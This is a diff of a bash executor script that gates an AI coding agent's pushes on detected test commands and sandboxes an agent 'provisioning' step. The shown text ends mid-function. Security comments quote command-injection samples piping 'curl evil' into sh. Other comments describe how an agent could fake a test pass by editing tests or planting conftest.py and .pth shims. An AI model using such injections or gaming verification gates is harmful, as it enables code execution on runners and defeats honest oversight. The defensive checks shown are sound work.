@@ -1,10 +1,7 @@
 #!/usr/bin/env bash
 # Operator-result executor that delegates the actual code work to opencode.
 #
-# Mirrors mac-task-executor-codex in shape: builds a mac.worker_evidence.v1
-# manifest, captures opencode's stdout + returncode, and signs the manifest
-# via `mac-evidence sign` (defined in src/mac/evidence_cli.py). NO inline
-# HMAC; signing invariants live in tests/test_evidence_cli.py.
+# Mirrors mac-task-executor-codex in shape: builds a mac.worker_evidence.v1 manifest, captures opencode's stdout + returncode, and signs the manifest via `mac-evidence sign` (defined in src/mac/evidence_cli.py). NO inline HMAC; signing invariants live in tests/test_evidence_cli.py.
 set -euo pipefail
 
 MAC_TASK_ID="${MAC_TASK_ID:-}"
@@ -16,19 +13,14 @@ MAC_WORKER_TOKEN="${MAC_WORKER_TOKEN:-}"
 ATTESTATION_KEY="${MAC_AGENT_ATTESTATION_KEY:-}"
 EVIDENCE_PATH="${MAC_TASK_EVIDENCE_MANIFEST_PATH:-/tmp/mac-evidence.json}"
 
-# opencode reads $XDG_CONFIG_HOME/opencode/opencode.json — point at the
-# ConfigMap mount baked into the Job pod by src/mac/k8s/runner.py.
-# opencode also writes state (~/.local, ~/.cache) — readOnlyRootFilesystem
-# blocks the default $HOME=/, so point all xdg paths + HOME at /tmp (which
-# is an emptyDir mounted writable).
+# opencode reads $XDG_CONFIG_HOME/opencode/opencode.json — point at the ConfigMap mount baked into the Job pod by src/mac/k8s/runner.py. opencode also writes state (~/.local, ~/.cache) — readOnlyRootFilesystem blocks the default $HOME=/, so point all xdg paths + HOME at /tmp (which is an emptyDir mounted writable).
 export HOME=/tmp/opencode-home
 export XDG_CONFIG_HOME="${HOME}/.config"
 export XDG_DATA_HOME="${HOME}/.local/share"
 export XDG_CACHE_HOME="${HOME}/.cache"
 export XDG_STATE_HOME="${HOME}/.local/state"
 mkdir -p "${HOME}/.local" "${XDG_CONFIG_HOME}/opencode" "${XDG_DATA_HOME}" "${XDG_CACHE_HOME}" "${XDG_STATE_HOME}"
-# Source config is the ConfigMap mount at /etc/opencode, overridable for
-# tests via MAC_OPENCODE_CONFIG_PATH.
+# Source config is the ConfigMap mount at /etc/opencode, overridable for tests via MAC_OPENCODE_CONFIG_PATH.
 OPENCODE_CONFIG_SRC="${MAC_OPENCODE_CONFIG_PATH:-/etc/opencode/opencode.json}"
 OPENCODE_CONFIG_DST="${XDG_CONFIG_HOME}/opencode/opencode.json"
 if [ -f "${OPENCODE_CONFIG_SRC}" ]; then
@@ -129,8 +121,7 @@ def render_feedback(task):
     return "\n".join(lines)[:8000]
 
 d = json.load(sys.stdin)
-# GET /tasks/{id} returns a wrapper {task, evidence, history, ...};
-# the actual task fields live under .task. Same shape for /projects/{id}.
+# GET /tasks/{id} returns a wrapper {task, evidence, history, ...}; the actual task fields live under .task. Same shape for /projects/{id}.
 t = d.get("task") or d.get("record") or d
 title = (t.get("title") or "").strip()
 desc = (t.get("description") or "").strip()
@@ -148,9 +139,7 @@ meta = (t.get("metadata") or {})
 print("SKIP_PR_OPEN=%s" % ("true" if meta.get("skip_pr_open") else ""))
 ' || true)"
     fi
-    # If task didn't carry the repo URL, fall back to project metadata.
-    # GET /projects/{name} returns a wrapper {project, summary, record, tasks,...};
-    # the project record (with its metadata) is nested under `record`.
+    # If task didn't carry the repo URL, fall back to project metadata. GET /projects/{name} returns a wrapper {project, summary, record, tasks,...}; the project record (with its metadata) is nested under `record`.
     if [ -z "${REPO_URL}" ] && [ -n "${PROJECT}" ]; then
         project_json="$(curl -fsS -H "Authorization: Bearer ${MAC_WORKER_TOKEN}" \
             "${MAC_URL}/projects/${PROJECT}" 2>/dev/null || true)"
@@ -171,8 +160,7 @@ echo "PROJECT:          ${PROJECT:-<unset>}"
 echo "REPO_URL:         ${REPO_URL:-<none — opencode runs without working tree>}"
 echo "REPO_BRANCH:      ${REPO_BRANCH}"
 
-# Rewrite https://... to https://<user>:<token>@... for git hosting.
-# Auto-detects the git host and uses appropriate credentials.
+# Rewrite https://... to https://<user>:<token>@... for git hosting. Auto-detects the git host and uses appropriate credentials.
 authed_url() {
     local u="$1"
     
@@ -207,25 +195,11 @@ authed_url() {
 # ---------------------------------------------------------------------------
 # Mandatory pre-push verification gate.
 #
-# Before ANY branch push or MR is created, the worker MUST run the project's
-# lint/format and test suites. This gate lives in the executor (the lowest
-# layer that performs the push + MR), so it CANNOT be bypassed by task-level
-# instructions or per-project config. It applies uniformly to every repo
-# (mac, ivan-plugin, hermes-agent-custom, and any future repo).
+# Before ANY branch push or MR is created, the worker MUST run the project's lint/format and test suites. This gate lives in the executor (the lowest layer that performs the push + MR), so it CANNOT be bypassed by task-level instructions or per-project config. It applies uniformly to every repo (mac, ivan-plugin, hermes-agent-custom, and any future repo).
 #
-# Contract:
-#   * Step A — detect the test command from the repo (package.json/pyproject/
-#     Makefile/README...). If it cannot be detected, the gate FAILS (we never
-#     silently skip — the task is routed to needs_review for manual
-#     verification).
-#   * Step B — run lint/format with an auto-fix attempt; lint failures are
-#     recorded as evidence but do NOT block (tests are the hard gate).
-#   * Step C — run the detected test command, capturing full stdout+stderr.
-#   * Step D — gate decision: tests pass (exit 0) -> allow push+MR; tests
-#     fail (or no command) -> block push+MR and surface evidence.
+# Contract:   * Step A — detect the test command from the repo (package.json/pyproject/     Makefile/README...). If it cannot be detected, the gate FAILS (we never     silently skip — the task is routed to needs_review for manual     verification).   * Step B — run lint/format with an auto-fix attempt; lint failures are     recorded as evidence but do NOT block (tests are the hard gate).   * Step C — run the detected test command, capturing full stdout+stderr.   * Step D — gate decision: tests pass (exit 0) -> allow push+MR; tests     fail (or no command) -> block push+MR and surface evidence.
 #
-# These functions write their results into the GATE_* globals consumed when
-# building the evidence manifest below.
+# These functions write their results into the GATE_* globals consumed when building the evidence manifest below.
 # ---------------------------------------------------------------------------
 
 # Lint/format results.
@@ -245,9 +219,10 @@ GATE_TEST_SUGGESTION=""
 # Overall gate verdict: "pass" allows push+MR; anything else blocks.
 GATE_VERDICT="not_run"          # pass | fail
 GATE_REASON=""
+# Set to "true" if the PROVISION-ONLY agent fallback ran but the post-run `git reset --hard` revert FAILED — we can no longer trust the tree state, so the gate must fail closed (block) rather than judge a possibly-tampered tree.
+GATE_PROVISION_UNSAFE="false"
 
-# Truncate a captured output string to its last N lines (default 200) and
-# prefix a marker when truncation occurred. Reads from $1 (a file path).
+# Truncate a captured output string to its last N lines (default 200) and prefix a marker when truncation occurred. Reads from $1 (a file path).
 _gate_tail_output() {
     local path="$1" max="${2:-200}" total
     [ -f "${path}" ] || return 0
@@ -261,42 +236,19 @@ _gate_tail_output() {
     fi
 }
 
-# Step A: detect the test command. Echoes the command on stdout, or nothing
-# if it cannot be determined. Detection precedence mirrors the directive in
-# AGENTS.md.
-#
-# Improvement: pre-scan for actual test files to avoid mis-detecting polyglot
-# repos (e.g., TypeScript projects with pyproject.toml for Python tooling).
-gate_detect_test_command() {
-    local d="$1"
-    
-    # Pre-scan: detect what kind of test files exist (stronger signal than config)
-    # This prevents mis-detecting TypeScript/React projects as Python projects
-    # when they have pyproject.toml for tooling (ruff, black, mypy).
-    # maxdepth=3 balances coverage vs performance (avoids deep node_modules scans).
-    local has_js_tests=0
-    
-    # Check for JavaScript/TypeScript test files
-    # Common patterns: *.test.{js,jsx,ts,tsx}, *.spec.{js,jsx,ts,tsx}, __tests__/
-    # Use timeout to prevent hanging on pathological repos (filesystem issues, loops).
-    if timeout 2s find "${d}" -maxdepth 3 -type f \( \
-            -name "*.test.js" -o -name "*.test.jsx" -o \
-            -name "*.test.ts" -o -name "*.test.tsx" -o \
-            -name "*.spec.js" -o -name "*.spec.jsx" -o \
-            -name "*.spec.ts" -o -name "*.spec.tsx" \
-        \) -print -quit 2>/dev/null | grep -q .; then
-        has_js_tests=1
-    # Check for __tests__/ directory, but verify it contains test files
-    elif [ -d "${d}/__tests__" ] && \
-         timeout 2s find "${d}/__tests__" -maxdepth 2 -type f \( \
-            -name "*.test.*" -o -name "*.spec.*" \
-         \) -print -quit 2>/dev/null | grep -q .; then
-        has_js_tests=1
+# Helper: run a command under a wall-clock timeout when `timeout` is available, otherwise run it directly. The base image ships coreutils (timeout present), but detection must not silently no-op if it is ever absent — without this guard a missing `timeout` makes every `timeout ... find` exit command-not-found, zeroing out JS-test detection.
+_with_timeout() {
+    local secs="$1"; shift
+    if command -v timeout >/dev/null 2>&1; then
+        timeout "${secs}s" "$@"
+    else
+        "$@"
     fi
-    
-    # 1. Node: package.json with a `test` script.
-    if [ -f "${d}/package.json" ]; then
-        if python3 - "${d}/package.json" <<'PYEOF' 2>/dev/null
+}
+
+# Helper: does package.json at $1 declare a non-empty `test` script?
+_pkg_has_test_script() {
+    python3 - "$1" <<'PYEOF' 2>/dev/null
 import json, sys
 try:
     with open(sys.argv[1], "r", encoding="utf-8") as fh:
@@ -306,111 +258,485 @@ except Exception:
 scripts = pkg.get("scripts") or {}
 sys.exit(0 if scripts.get("test") else 1)
 PYEOF
-        then
+}
+
+# Helper: are there JS/TS test files anywhere under $1 (node_modules/.git pruned)? Bounded by a timeout to stay safe on pathological trees. No maxdepth cap — monorepo test files routinely live well below depth 3 (e.g. dashboard/src/features/fitness/Foo.test.tsx).
+_dir_has_js_tests() {
+    local d="$1"
+    _with_timeout 5 find "${d}" \
+            \( -name node_modules -o -name .git -o -name dist -o -name build \) -prune -o \
+            -type f \( \
+                -name "*.test.js" -o -name "*.test.jsx" -o \
+                -name "*.test.ts" -o -name "*.test.tsx" -o \
+                -name "*.spec.js" -o -name "*.spec.jsx" -o \
+                -name "*.spec.ts" -o -name "*.spec.tsx" \
+            \) -print -quit 2>/dev/null | grep -q .
+}
+
+# Helper: find the shallowest subdirectory package.json (excluding the repo root itself) that declares a `test` script. Prints the project directory (relative to $1) on success. Used for monorepo / subdir JS projects where the JS app lives under e.g. dashboard/ or frontend/ while the repo root carries only Python tooling or a Makefile.
+_find_subdir_js_project() {
+    local d="$1" pkg proj
+    # Sort by path depth (fewest slashes first) so the shallowest project wins deterministically. Prune node_modules/.git to avoid matching dependency manifests.
+    while IFS= read -r pkg; do
+        [ -z "${pkg}" ] && continue
+        # Skip the repo-root package.json (handled by the root checks).
+        if [ "${pkg}" = "${d}/package.json" ]; then continue; fi
+        if _pkg_has_test_script "${pkg}"; then
+            proj="$(dirname "${pkg}")"
+            echo "${proj}"
+            return 0
+        fi
+    done <<EOF
+$(_with_timeout 5 find "${d}" \
+        \( -name node_modules -o -name .git -o -name dist -o -name build \) -prune -o \
+        -type f -name package.json -print 2>/dev/null \
+    | awk '{ n=gsub("/","/"); print n"\t"$0 }' | sort -n | cut -f2-)
+EOF
+    return 1
+}
+
+# Step A: detect the test command. Echoes the command on stdout, or nothing if it cannot be determined. Detection precedence mirrors the directive in AGENTS.md.
+#
+# Monorepo-aware: the repo root is checked first, but if the root yields no test command, the project tree is scanned for a subdirectory JS project (package.json with a `test` script). When the test command lives in a subdirectory, the emitted command is `cd <reldir> && <cmd>` so the single `bash -c "${GATE_TEST_COMMAND}"` execution runs in the right place.
+gate_detect_test_command() {
+    local d="$1"
+
+    # Pre-scan: detect whether JS/TS test files exist (a stronger signal than config) to avoid mis-detecting polyglot repos (e.g. TS projects carrying pyproject.toml only for ruff/black tooling). No depth cap.
+    local has_js_tests=0
+    if _dir_has_js_tests "${d}"; then
+        has_js_tests=1
+    fi
+
+    # 1. Node: root package.json with a `test` script.
+    if [ -f "${d}/package.json" ]; then
+        if _pkg_has_test_script "${d}/package.json"; then
             echo "npm test"
             return 0
-        elif [ "${has_js_tests}" -eq 1 ]; then
-            # package.json exists, JS/TS test files found, but no test script!
-            # This is a misconfigured JS project, not a Python project.
-            # Returning empty will trigger "not_detected" and block with helpful message.
-            echo "[opencode-build] gate: WARNING - found JS/TS test files but no 'test' script in package.json" >&2
-            echo "[opencode-build] gate:          Add '\"test\": \"jest\"' (or vitest/mocha) to package.json scripts" >&2
-            return 1
         fi
+        # Root package.json with no test script: do NOT block yet. The test entrypoint may legitimately be a Makefile, or a subdir JS project. Fall through to the remaining detectors.
     fi
-    
-    # 2. Python: pyproject/pytest.ini/setup.cfg/setup.py -> pytest.
-    # BUT: if we detected JS/TS test files, be cautious about pyproject.toml
-    # (it might be for Python tooling like ruff/black in a JS project).
+
+    # 2. Python: pyproject/pytest.ini/setup.cfg/setup.py -> pytest. If JS/TS test files exist, treat pyproject.toml as tooling-only and skip pytest (unless pytest.ini explicitly forces pytest).
     if [ -f "${d}/pytest.ini" ]; then
-        # pytest.ini is a strong signal for pytest - always trust it
         echo "pytest"
         return 0
     fi
-    
     if [ -f "${d}/pyproject.toml" ] || [ -f "${d}/setup.cfg" ] || [ -f "${d}/setup.py" ]; then
-        # If we found JS/TS test files, skip pytest detection
-        # (pyproject.toml is likely for Python tooling, not pytest)
         if [ "${has_js_tests}" -eq 1 ]; then
-            echo "[opencode-build] gate: WARNING - found JS/TS test files and pyproject.toml; skipping pytest" >&2
-            echo "[opencode-build] gate:          If this is a Python project, create pytest.ini to force pytest detection" >&2
-            # Continue to next detection method instead of assuming pytest
+            echo "[opencode-build] gate: found JS/TS test files alongside pyproject.toml; skipping pytest (treating Python config as tooling)" >&2
         else
-            # No JS tests detected, pyproject.toml likely means pytest
             echo "pytest"
             return 0
         fi
     fi
-    
-    # 3. Make: Makefile with a `test` target.
+
+    # 3. Subdir JS project: monorepo where the JS app (with a `test` script) lives under a subdirectory (e.g. dashboard/, frontend/). This is the common false-negative shape — root has Python tooling + a Makefile whose `test:` chain eventually calls npm, but the JS project has an explicit test script we can target directly. An explicit subdir test script is a STRONGER signal than a root Makefile, so this check must come BEFORE the Makefile fallback.
+    local sub rel
+    if sub="$(_find_subdir_js_project "${d}")"; then
+        rel="${sub#${d}/}"
+        # SECURITY: rel is a repo-controlled subdir name that gets interpolated into GATE_TEST_COMMAND and later run via `bash -c`. A crafted dir name (e.g. `x; curl evil|sh #`) would otherwise inject/short-circuit the gate's judged command. Only emit it when it is a plain RELATIVE path: must START with an alphanumeric (no leading `-`, which `cd` would parse as an option; no leading `/`, an absolute path) and otherwise contain only [A-Za-z0-9._/-]. We also emit `cd --` so the path can never be treated as a cd option even if a future change relaxes the regex. Anything else falls through to the next detector.
+        if printf '%s' "${rel}" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9._/-]*$'; then
+            echo "cd -- ${rel} && npm test"
+            return 0
+        fi
+        echo "[opencode-build] gate: subdir JS project path '${rel}' contains unsafe characters — skipping subdir detection" >&2
+    fi
+
+    # 4. Make: Makefile with a `test` target (fallback when no JS project found anywhere — pure Python/Go/Rust repos with a Makefile).
     if [ -f "${d}/Makefile" ]; then
         if grep -Eq '^test:' "${d}/Makefile" 2>/dev/null; then
             echo "make test"
             return 0
         fi
     fi
-    
-    # 4. README/CONTRIBUTING: scan for an explicit test command.
+
+    # 5. Misconfigured JS root: package.json + JS test files but no `test` script and nothing else detected. Block with a helpful message.
+    if [ -f "${d}/package.json" ] && [ "${has_js_tests}" -eq 1 ]; then
+        echo "[opencode-build] gate: WARNING - found JS/TS test files but no 'test' script in package.json" >&2
+        echo "[opencode-build] gate:          Add '\"test\": \"jest\"' (or vitest/mocha) to package.json scripts" >&2
+        return 1
+    fi
+
+    # 6. README/CONTRIBUTING: scan for an explicit test command.
+    #
+    # SECURITY (gate-detect-cmd-rce-01): the captured string becomes GATE_TEST_COMMAND, which gate_run_tests later executes as `bash -c "${GATE_TEST_COMMAND}"`. README/CONTRIBUTING content is attacker-influenced (semi-trusted agent output), so a greedy `[^\n]*` tail like `go test [^\n]*` would capture `go test; curl evil | sh` and hand it to `bash -c` — arbitrary command execution on the runner. We therefore (a) bound the tails to a safe-argument character class (no shell metacharacters) and (b) re-validate the whole capture against the same class before accepting it, so nothing carrying `;`, `|`, `&`, `$`, backticks, redirections, parens, quotes, or escapes can reach `bash -c`.
     local doc cmd
+    # Safe trailing args: spaces, flags, paths, globs (`./...`), `=` for `--opt=value`. Deliberately EXCLUDES ; | & $ ` ( ) < > ' " \ and newlines.
+    local safe_tail='[A-Za-z0-9 ._/=:-]*'
     for doc in README.md CONTRIBUTING.md; do
         if [ -f "${d}/${doc}" ]; then
-            cmd="$(grep -Eio '(npm (run )?test|pytest[^\n]*|make test|uv run[^\n]*pytest[^\n]*|cargo test|go test [^\n]*)' "${d}/${doc}" 2>/dev/null | head -1)"
+            # `grep -m1` (stop after first match) instead of `... | head -1`: under `set -o pipefail`, head closing the pipe early SIGPIPEs grep to a non-zero status, which can spuriously empty `cmd` (M2).
+            cmd="$(grep -m1 -Eio "(npm (run )?test|pytest${safe_tail}|make test|uv run${safe_tail}pytest${safe_tail}|cargo test|go test ${safe_tail})" "${d}/${doc}" 2>/dev/null || true)"
             if [ -n "${cmd}" ]; then
-                echo "${cmd}"
-                return 0
+                # Trim a trailing space the bounded tail may have captured.
+                cmd="${cmd%"${cmd##*[![:space:]]}"}"
+                # Defense in depth: reject anything that is not entirely a known-safe test invocation. A command containing a shell metacharacter (would only appear if the regex above were later loosened) is dropped rather than executed.
+                if printf '%s' "${cmd}" | grep -Eq '^(npm (run )?test|pytest[A-Za-z0-9 ._/=:-]*|make test|uv run[A-Za-z0-9 ._/=:-]*pytest[A-Za-z0-9 ._/=:-]*|cargo test|go test [A-Za-z0-9 ._/=:-]*)$'; then
+                    echo "${cmd}"
+                    return 0
+                fi
+                echo "[opencode-build] gate: ignoring README test command with unsafe characters: '${cmd}'" >&2
             fi
         fi
     done
-    
+
     # Could not detect.
     return 1
 }
 
-# Step A.5: ensure test command dependencies are installed.
-# If the detected command is not available, attempt to install it.
-# Creates a per-task virtual environment to isolate dependencies and avoid
-# PATH pollution/permission issues with system site-packages.
+# Helper: resolve the Node version a JS project requires. Checks (in order):   1. .nvmrc in the project dir   2. .node-version in the project dir   3. engines.node in package.json (strips semver range operators)   4. node-version: field in any .github/workflows/*.yml or .gitea/workflows/*.yml Prints a bare version string (e.g. "22" or "22.12.0") or nothing if unknown.
+_resolve_node_version() {
+    local pdir="$1"
+
+    # 1. .nvmrc
+    if [ -f "${pdir}/.nvmrc" ]; then
+        tr -d '[:space:]' < "${pdir}/.nvmrc"
+        return 0
+    fi
+
+    # 2. .node-version
+    if [ -f "${pdir}/.node-version" ]; then
+        tr -d '[:space:]' < "${pdir}/.node-version"
+        return 0
+    fi
+
+    # 3. package.json engines.node
+    if [ -f "${pdir}/package.json" ]; then
+        local ver
+        ver="$(python3 - "${pdir}/package.json" <<'PYEOF' 2>/dev/null
+import json, re, sys
+try:
+    p = json.load(open(sys.argv[1], encoding="utf-8"))
+    raw = (p.get("engines") or {}).get("node", "")
+    # strip range operators: >=18, ^22, ~20, 22.x -> bare major
+    m = re.search(r'(\d+)', raw)
+    if m:
+        print(m.group(1))
+except Exception:
+    pass
+PYEOF
+)"
+        if [ -n "${ver}" ]; then
+            echo "${ver}"
+            return 0
+        fi
+    fi
+
+    # 4. CI workflow files (.gitea or .github). Search BOTH the project dir's own workflows (root-level project) AND the parent's (subdir project whose workflows live at the repo root) — searching only "../" missed root projects entirely (H1).
+    local wf ver
+    for wf in "${pdir}/.gitea/workflows/"*.yml \
+               "${pdir}/.gitea/workflows/"*.yaml \
+               "${pdir}/.github/workflows/"*.yml \
+               "${pdir}/.github/workflows/"*.yaml \
+               "${pdir}/../.gitea/workflows/"*.yml \
+               "${pdir}/../.gitea/workflows/"*.yaml \
+               "${pdir}/../.github/workflows/"*.yml \
+               "${pdir}/../.github/workflows/"*.yaml; do
+        [ -f "${wf}" ] || continue
+        ver="$(grep -m1 -Eo 'node-version:[ ]*[0-9]+' "${wf}" 2>/dev/null | grep -Eo '[0-9]+' || true)"
+        if [ -n "${ver}" ]; then
+            echo "${ver}"
+            return 0
+        fi
+    done
+
+    return 1
+}
+
+# Helper: resolve the Python version a project requires. Checks (in order):   1. .python-version in the project dir   2. project.requires-python / tool.* in pyproject.toml (bare major.minor) Prints a bare version (e.g. "3.13") or nothing if unknown.
+_resolve_python_version() {
+    local pdir="$1"
+
+    if [ -f "${pdir}/.python-version" ]; then
+        # .python-version may carry a patch (3.13.1) or pyenv name; take the leading major[.minor] only.
+        grep -m1 -Eo '^[0-9]+(\.[0-9]+)?' "${pdir}/.python-version" 2>/dev/null || true
+        return 0
+    fi
+
+    if [ -f "${pdir}/pyproject.toml" ]; then
+        local ver
+        ver="$(python3 - "${pdir}/pyproject.toml" <<'PYEOF' 2>/dev/null
+import re, sys
+try:
+    txt = open(sys.argv[1], encoding="utf-8").read()
+    # Only consider the requires-python line itself (avoid matching a
+    # commented-out duplicate elsewhere in the file: take the first
+    # non-comment assignment).
+    m = None
+    for line in txt.splitlines():
+        s = line.strip()
+        if s.startswith("#"):
+            continue
+        mm = re.match(r'requires-python\s*=\s*["\']([^"\']+)["\']', s)
+        if mm:
+            m = mm
+            break
+    if m:
+        # A PEP 440 specifier may carry an UPPER bound first
+        # (e.g. "<3.14,>=3.11"). Provisioning the upper exclusive bound is
+        # wrong (it may not exist). We provision the MINIMUM SATISFYING
+        # interpreter. For inclusive lower bounds (">=", "~=", "==", or a
+        # bare version) that is the declared minor; for a STRICT lower bound
+        # (">3.11") the declared minor is EXCLUDED, so bump to the next minor
+        # (3.12) — otherwise uv would provision an interpreter PEP 440 rejects.
+        spec = m.group(1)
+        # Collect (operator, version) pairs; operator may be empty (bare).
+        clauses = re.findall(r'(>=|<=|==|~=|!=|>|<)?\s*(\d+\.\d+)', spec)
+        # Lower-bound candidates: anything that is NOT an upper bound ("<"/"<=").
+        cands = []
+        for op, ver in clauses:
+            if op in ('<', '<='):
+                continue
+            major, minor = (int(x) for x in ver.split('.'))
+            if op == '>':
+                # strictly greater: declared minor excluded -> next minor.
+                minor += 1
+            cands.append((major, minor))
+        if cands:
+            best = min(cands)
+            print("%d.%d" % best)
+except Exception:
+    pass
+PYEOF
+)"
+        if [ -n "${ver}" ]; then
+            echo "${ver}"
+            return 0
+        fi
+    fi
+
+    return 1
+}
+
+# Helper: create/activate a per-task venv built against the Python version the project declares, using uv. Falls back to the image's python3 when no version is declared or uv is absent. Exports VIRTUAL_ENV + PATH in-process and echoes the venv path so the caller can reuse it.
+_activate_python_for() {
+    local pdir="$1"
+    # Use PID when no task id is set (review #6) so concurrent/rapid runs don't collide on a stale /tmp/mac-task-venv-unknown.
+    local venv_path="/tmp/mac-task-venv-${MAC_TASK_ID:-$$}"
+    local want
+    want="$(_resolve_python_version "${pdir}" || true)"
+
+    # Reuse a cached per-task venv ONLY when it was built against the version the project still declares. Without this check a task re-run after a `requires-python` bump silently reuses the STALE interpreter — the exact "tested against the wrong runtime" failure version-aware provisioning is meant to prevent (gate-venv-staleness-01). We record the resolved version in `${venv_path}/.mac-python-version` at build time and rebuild on mismatch. An undeclared `want` (empty) reuses any cached venv as before.
+    if [ -d "${venv_path}" ]; then
+        local cached_ver=""
+        [ -f "${venv_path}/.mac-python-version" ] && \
+            cached_ver="$(tr -d '[:space:]' < "${venv_path}/.mac-python-version" 2>/dev/null || true)"
+        if [ -z "${want}" ] || [ "${cached_ver}" = "${want}" ]; then
+            export VIRTUAL_ENV="${venv_path}"
+            export PATH="${venv_path}/bin:${PATH}"
+            echo "${venv_path}"
+            return 0
+        fi
+        echo "[opencode-build] gate: cached venv built for Python '${cached_ver:-unknown}' but project now requires '${want}' — rebuilding" >&2
+        rm -rf -- "${venv_path}"
+    fi
+
+    if [ -n "${want}" ] && command -v uv >/dev/null 2>&1; then
+        echo "[opencode-build] gate: project requires Python ${want} — provisioning via uv..." >&2
+        if uv venv --python "${want}" "${venv_path}" 2>&1 | tail -3 >&2; then
+            printf '%s\n' "${want}" > "${venv_path}/.mac-python-version" 2>/dev/null || true
+            export VIRTUAL_ENV="${venv_path}"
+            export PATH="${venv_path}/bin:${PATH}"
+            echo "[opencode-build] gate: python now $("${venv_path}/bin/python" --version 2>/dev/null || echo unknown)" >&2
+            echo "${venv_path}"
+            return 0
+        fi
+        echo "[opencode-build] gate: uv venv --python ${want} failed — falling back to system python3" >&2
+    fi
+
+    # Fallback: system python3 venv (prior behavior). Use `tail` not `head` to diagnostic-trim: piping to `head` under `set -o pipefail` SIGPIPEs the producer into a non-zero status once output exceeds the limit, which would falsely fail this `if` and strand a valid venv (see _npm_install_in).
+    if python3 -m venv "${venv_path}" 2>&1 | tail -5 >&2; then
+        # Record the declared version (if any) so a later requires-python bump is detected as stale and rebuilt (gate-venv-staleness-01). When the project declares no version there is nothing to go stale against.
+        [ -n "${want}" ] && \
+            { printf '%s\n' "${want}" > "${venv_path}/.mac-python-version" 2>/dev/null || true; }
+        export VIRTUAL_ENV="${venv_path}"
+        export PATH="${venv_path}/bin:${PATH}"
+        echo "${venv_path}"
+        return 0
+    fi
+    return 1
+}
+
+# Helper: PROVISION-ONLY agent fallback for stacks the registry does not handle. Invokes opencode with a restricted prompt: make the test command runnable WITHOUT touching source, tests, or the command itself. The gate re-runs and judges the real command afterward in gate_run_tests — the agent never decides the verdict.
+#
+# TRUST-BOUNDARY GUARD (review #1): a prompt is NOT a sandbox. opencode has bash/write/edit tools and could edit tests to make the real command pass. The executor commits the agent's legitimate work to HEAD BEFORE the gate runs (mac-task-executor-opencode-build lines ~894-898, then checks out WORK_REF at ~935 before gate_run_tests at ~937). So HEAD already carries the real change. We snapshot HEAD, run the provisioning agent, then `git reset --hard` back to that SHA — undoing ANY edit/commit the provisioning agent made to tracked files, while preserving the committed work AND any untracked dependency artifacts (target/, vendor/, .venv). No per-ecosystem source/test path detection needed.
+#
+# OPT-IN (review #2): an unsandboxed agent must NOT run by default. Mirrors AGENTS.md's MAC_BEADS_BRIDGE_ENABLED posture (off unless explicitly =1).
+_provision_unknown_with_agent() {
+    local d="$1" cmd="$2"
+    command -v opencode >/dev/null 2>&1 || return 0
+    [ "${MAC_GATE_AGENT_PROVISION_ENABLED:-0}" = "1" ] || {
+        echo "[opencode-build] gate: unknown stack '${cmd}' but agent provisioning disabled (set MAC_GATE_AGENT_PROVISION_ENABLED=1 to enable)" >&2
+        return 0
+    }
+
+    local prompt
+    prompt="PROVISION-ONLY: Install whatever toolchain, runtime, or system \
+dependencies are required so that the command \`${cmd}\` can EXECUTE in \
+this repository. Do NOT modify any source files, test files, or the test \
+command. Do NOT attempt to make tests pass — only make the toolchain \
+available. When the environment is ready, stop."
+
+    # Snapshot HEAD so we can hard-revert any tracked-file changes the agent makes (the verdict-safety guard).
+    local pre_sha=""
+    pre_sha="$(cd "${d}" && git rev-parse HEAD 2>/dev/null || true)"
+
+    # Fail CLOSED: if we cannot snapshot HEAD we cannot revert the agent's tracked-file edits afterward, so do NOT run an un-revertable agent. Skipping provisioning leaves the real command to fail and the gate to block — the safe outcome — rather than judging an unreverted tree.
+    if [ -z "${pre_sha}" ]; then
+        echo "[opencode-build] gate: cannot snapshot HEAD (not a git repo or no commits) — skipping agent provisioning (fail-closed)" >&2
+        return 0
+    fi
+
+    # Snapshot the set of untracked files BEFORE the agent runs. `git reset --hard` (below) only reverts TRACKED files; untracked files the agent drops survive it. A misaligned agent can therefore plant an untracked shim that poisons the verdict — a new root conftest.py / pytest.ini / sitecustomize.py that skips failing tests, a vendored module shadowing a real import, or a .pth file. After the run we diff against this snapshot and scrub any NEW untracked path that is not inside a dependency/build dir (gate-provision-untracked-poison-01). Pre-existing untracked files and legitimately-installed deps are preserved.
+    local pre_untracked; pre_untracked="$(mktemp)"
+    ( cd "${d}" && git ls-files --others --exclude-standard 2>/dev/null || true ) \
+        | LC_ALL=C sort > "${pre_untracked}"
+
+    echo "[opencode-build] gate: unknown stack — invoking PROVISION-ONLY agent fallback for '${cmd}'" >&2
+    # Capture provisioning output (review #4): do NOT discard to /dev/null — when an unknown-stack project fails, this is the only evidence of what the agent attempted. Surface it on stderr (captured into the run log).
+    local prov_log; prov_log="$(mktemp)"
+    ( cd "${d}" && opencode run "${prompt}" >"${prov_log}" 2>&1 ) || \
+        echo "[opencode-build] gate: provisioning agent returned non-zero (continuing; gate will judge real command)" >&2
+    echo "[opencode-build] gate: --- provisioning agent output (tail) ---" >&2
+    tail -n 40 "${prov_log}" >&2 || true
+    echo "[opencode-build] gate: --- end provisioning output ---" >&2
+    rm -f "${prov_log}"
+
+    # Hard-revert any tracked-file edits/commits the agent made. Untracked files (installed deps/build artifacts) are intentionally preserved.
+    #
+    # Fail CLOSED on revert failure: if `git reset --hard` does NOT succeed, the agent's tracked-file edits/commits may survive into the verdict run, which would let a misaligned agent manufacture a pass. We cannot trust the tree, so flag it; gate_run_tests blocks instead of judging a tampered tree.
+    if [ -n "${pre_sha}" ]; then
+        if ( cd "${d}" && git reset --hard "${pre_sha}" >/dev/null 2>&1 ); then
+            echo "[opencode-build] gate: reverted tracked-file changes from provisioning to ${pre_sha}" >&2
+        else
+            GATE_PROVISION_UNSAFE="true"
+            echo "[opencode-build] gate: WARNING - could not revert provisioning agent changes (git reset --hard ${pre_sha} failed) — failing closed" >&2
+        fi
+    fi
+
+    # Scrub NEW untracked files the agent introduced OUTSIDE the dependency/ build allowlist (gate-provision-untracked-poison-01). `git reset --hard` above does not touch untracked files, so without this an agent-planted untracked shim (conftest.py, pytest.ini, sitecustomize.py, a .pth file, a shadowing module) survives into the verdict run and can manufacture a pass. We must NOT use a blanket `git clean -fd` — that would wipe the legitimately-installed dependencies the agent was invoked to provision. So we diff post-run untracked files against the pre-run snapshot and remove only the NEW ones whose top-level path component is not a known dependency/build/cache dir.
+    local post_untracked; post_untracked="$(mktemp)"
+    ( cd "${d}" && git ls-files --others --exclude-standard 2>/dev/null || true ) \
+        | LC_ALL=C sort > "${post_untracked}"
+    # `comm -13` = lines only in post (i.e. files created during the run).
+    local new_path top
+    while IFS= read -r new_path; do
